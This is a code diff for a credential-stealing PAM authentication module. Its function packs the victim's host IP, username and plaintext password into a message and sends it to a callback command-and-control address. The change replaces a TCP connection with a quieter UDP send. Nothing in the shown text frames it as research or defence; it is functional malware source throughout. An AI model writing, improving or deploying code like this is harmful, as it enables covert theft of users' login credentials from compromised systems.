@@ -70,37 +70,28 @@ int pam_send_authtok(const char *message, const char *username, const char *pass
     if (get_local_ip(ipaddr, sizeof(ipaddr)) < 0) {
         return 1;
     }
+    
+    int sock = socket(AF_INET, SOCK_DGRAM, 0);
+    if (sock < 0)
+        return 1;
 
-    // Create socket with timeout so if firewall rules stop this module from connecting, it doesn't stop authentication
-    struct timeval timeout;
-    timeout.tv_sec = 3; // 10 seconds
-    timeout.tv_usec = 0; // 0 microseconds
+    struct timeval timeout = { .tv_sec = 3, .tv_usec = 0 };
+    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
+    
 
-    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    struct sockaddr_in serv_addr = {0};
+    serv_addr.sin_family = AF_INET;
+    serv_addr.sin_port = htons(CALLBACK_PORT);
+    inet_pton(AF_INET, CALLBACK_IP, &serv_addr.sin_addr);
 
-    // Create socket to connect to c2 server
-    if (sock >= 0) {
-        struct sockaddr_in serv_addr;
-        serv_addr.sin_family = AF_INET;
-        serv_addr.sin_port = htons(CALLBACK_PORT);
-        inet_pton(AF_INET, CALLBACK_IP, &serv_addr.sin_addr);
+    char credentials[256];
+    snprintf(credentials, sizeof(credentials), RET_FMT, ipaddr, message, username, password);
 
-        if (setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout)) < 0) {
-            close(sock);
-        }
+    // Send message via UDP (non-blocking with timeout)
+    sendto(sock, credentials, strlen(credentials), 0,
+           (struct sockaddr *)&serv_addr, sizeof(serv_addr));
 
-        // Connect to c2 server on CALLBACK_IP and CALLBACK_PORT
-        if(connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) == 0) {
-            // Create credential message in RET_FMT format
-            char credentials[256];
-            snprintf(credentials, sizeof(credentials), RET_FMT, ipaddr, message, username, password);
-
-            // Send message to c2 server and close connection
-            send(sock, credentials, strlen(credentials), 0);
-            close(sock);
-         }
-    }
-
+    close(sock);
     return 0;
 }
 
